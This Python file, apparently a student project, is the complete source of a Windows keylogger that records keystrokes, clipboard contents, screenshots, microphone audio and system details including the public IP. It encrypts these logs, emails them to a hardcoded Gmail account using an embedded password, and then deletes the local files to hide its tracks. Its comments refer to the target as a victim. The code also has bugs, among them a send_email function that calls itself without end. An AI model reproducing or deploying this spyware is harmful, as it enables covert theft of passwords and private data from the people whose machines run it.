# Libraries
# emails libraries to email features
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# default modules for collecting computer information
import socket
import platform

import win32clipboard

# to grab keystrokes (key logs the key and listener listens for each key typed on the keyboard)
from pynput.keyboard import Key, Listener

# module to track the time
import time
import os

# modules for microphone capabilities
from scipy.io.wavfile import write
import sounddevice as sd

# module to encrypt files
from cryptography.fernet import Fernet

# to get username and to get more computer information
import getpass
from requests import get


# module to add screenshot functionality/ to only take one screenshot at a time
from multiprocessing import Process, freeze_support
from PIL import ImageGrab


# module to add screenshot functionality/ to only take one screenshot at a time
keys_information = "key_log.txt" # where all the key that are logged going to be appended to
system_information = "syseminfo.txt" # create a new file for system information (processor, hostname, private IP address)
clipboard_information = "clipboard.txt" #file to save clipboard information
audio_information = "audio.wav" # file to save microphone recordings
screenshot_information = "screenshot.png" # file to save screenshot information

#encryption for the log files .txt extension
keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10 # define microphone time
time_iteration = 15
number_of_iterations_end = 3

email_address = "collegepjct@gmail.com" # EMAIL address of the sender
password = "Pr&c!s@Mud4r"

username = getpass.getuser() # get the user name of the user we are targeting

toaddr = "collegepjct@gmail.com" # EMAIL address of the receiver

key = "mOOgAe5l_n7wilOabmrwkszi8Jx4JBZvWde3vG3nvXA=" # Generate an encryption key from the Cryptography folder

file_path = "D:\\NCI\\Semester_3\\Project\\Keylogger\\Test2\\Project"  # file path where the key_log.txt will be store
extend = "\\"
file_merge = file_path + extend #combine file path + extension

# email controls/functionality - send the keystrokes to email
def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    # instance of MIMEMultipart
    # create a message (Multi internet mail extensions) allowing to format email msg to support character, text and attachments
    msg = MIMEMultipart()

    msg['From'] = fromaddr # storing the senders email address

    msg['To'] = toaddr # storing the senders email address

    msg['Subject'] = "Log File" # storing the subject

    body = "Body_of_the_mail" #string to store the body of the mail

    msg.attach(MIMEText(body, 'plain')) #attach the body with the msg instance

    # attach the body with the msg instance
    filename = filename
    attachment = open(attachment, 'rb')

    # attach the body with the msg instance
    p = MIMEBase('application', 'octet-stream')

    # To change the payload into encoded form
    p.set_payload((attachment).read())

    # encode into base64
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename) # add header to the msg

    msg.attach(p) # attach the instance 'p' to instance 'msg'

    # attach the instance 'p' to instance 'msg'
    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls() # start TLS for security

    s.login(fromaddr, password) # Authentication

    text = msg.as_string() # Converts the Multipart msg into a string

    s.sendmail(fromaddr, toaddr, text) # sending the mail

    s.quit() # terminating the session

    send_email(keys_information, file_path + extend + keys_information, toaddr)

# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f: # open systemInfo.txt file
        hostname = socket.gethostname() # to get the hostname
        IPAddr = socket.gethostbyname(hostname) #to get the IP address

        # find th public IP Address using ipify
        try:
            public_ip = get("https://api.ipify.org").text # define the public IP variable, get info and convert to text
            f.write("Public IP Address: " + public_ip) # write the public IP to the log file

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        # get processor, system, machine, hostname and private IP information - Using platform module
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f: #open file

        # allow to append only strings to the e_clipboard.txt file which mean only text you be save to it
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData() # get clipboard information
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data) # write the date to the e_clipboard.txt file

        # if it is not a string the keylogger throw an exception msg
        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()

# get the microphone
def microphone():
    fs = 44100 # set sampling frequency to 44100 hertz
    seconds = microphone_time # specify the amount of second want to record the microphone

    # use sound record module to record microphone
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2) # convert seconds into sampling frequency (fs)
    sd.wait() # wait record to take place

    write(file_path + extend + audio_information, fs, myrecording) #write to a .wav file

# get screenshots
def screenshot():
    im = ImageGrab.grab() #grabbing image
    im.save(file_path + extend + screenshot_information) # save to file

screenshot()

# Timer for keylogger
number_of_iterations = 0 #base of value for the counter
currentTime = time.time() #get current time of when the keylogger is launched
stoppingTime = time.time() + time_iteration

# query the numbers of iteration the Keylogger will go through x iteration of each feature at 15 seconds
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[] # where each key will be appended to the list

    def on_press(key):
        global keys, count, currentTime

        print(key) # where each key will be appended to the list
        keys.append(key)  # append each key to a empty list
        count += 1 # increase the key count by one
        currentTime = time.time() # every time a key is pressed currentTime will be queried

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    # write the keys to the key_log.txt file
    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f: # open the file, to start append data to the file
            for key in keys: # loop through each of keys with keys the list that have been appended (checking for modifications)
                k = str(key).replace("'", "") # replace single quote for nothing (blank)

                # make it each word readable on a different line (if the space bar is typed and is greater than 0 it create a new line
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()

                # check the value of each key and write the key to the file
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    # to exit of the keylogger
    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    # to listens for each key and implement on_press, write_file and on_release functions
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # check if currentTime is greater the stoppingTime fo the rest of the features
    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        # get the features
        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1 #increase numbers of the iterations

        currentTime = time.time() #update time
        stoppingTime = time.time() + time_iteration

# Encrypt files on the victim/user machine
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0
# loop to traverse through the files to encrypt and encrypt it
for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:   # open each file and read the date
        data = f.read()

    # encrypt the data
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    # encrypt the data
    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)

# Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)